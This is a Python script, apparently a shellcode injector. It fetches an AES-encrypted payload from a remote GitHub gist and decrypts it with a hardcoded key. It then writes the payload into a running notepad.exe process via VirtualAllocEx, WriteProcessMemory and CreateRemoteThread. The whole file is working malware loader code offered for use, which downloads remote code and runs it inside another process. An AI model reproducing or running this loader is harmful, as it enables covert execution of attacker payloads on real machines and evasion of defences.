import ctypes
import ctypes.wintypes
import urllib.request
from Crypto.Cipher import AES
from base64 import b64decode
from psutil import process_iter
from os import getlogin

hash_randomizer = '56797768723989728776752398'

def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

def main():
    key = b'eax94il288nyq0rv'

    page = urllib.request.urlopen("https://gist.githubusercontent.com/m1kemu/e14d7e8ddc0257d083d2f8de2905df36/raw/45a463bf5eedd75b648d9082b867f7b9f9eb7d69/download_me.txt")
    message = page.read()
    message = message.decode()

    ciphertext_b64 = message.split(':')[0]
    iv_b64 = message.split(':')[1]

    ciphertext = b64decode(ciphertext_b64)
    iv = b64decode(iv_b64)

    shellcode = aes_decrypt(ciphertext, key, iv)

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [ctypes.wintypes.HANDLE]
    CloseHandle.restype = ctypes.wintypes.BOOL

    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.LPVOID, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID]
    CreateRemoteThread.restype = ctypes.wintypes.HANDLE

    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
    OpenProcess.restype = ctypes.wintypes.HANDLE

    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
    VirtualAllocEx.restype = ctypes.wintypes.LPVOID

    VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
    VirtualFreeEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD]
    VirtualFreeEx.restype = ctypes.wintypes.BOOL

    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
    VirtualProtectEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID]
    VirtualProtectEx.restype = ctypes.wintypes.BOOL

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, ctypes.c_size_t, ctypes.wintypes.LPVOID]
    WriteProcessMemory.restype = ctypes.wintypes.BOOL

    my_username = getlogin()
    proc_to_find = 'notepad.exe'
    my_pid = None

    for proc in process_iter():
        try:
            pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
        except psutil.NoSuchProcess:
            pass
        else:
            if pinfo['username']:
                ps_username = (pinfo['username']).split('\\')[1]
                pid = pinfo['pid']
                name = pinfo['name']

                if ps_username == my_username and name == proc_to_find:
                    my_pid = pid
                    print(f'{my_username}:{ps_username}:{pid}:{name}')

                    break

    handle = OpenProcess(0x0028, False, my_pid)
    memptr = VirtualAllocEx(handle, 0, len(shellcode), 0x1000, 0x40)
    result = WriteProcessMemory(handle, memptr, shellcode, len(shellcode), 0)
    result = VirtualProtectEx(handle, memptr, len(shellcode), 0x20, 0)
    thread = CreateRemoteThread(handle, 0, 0, memptr, 0, 0, 0)
    VirtualFreeEx(handle, memptr, 0, 0xC000)
    CloseHandle(handle)


if __name__ == '__main__':
    main()
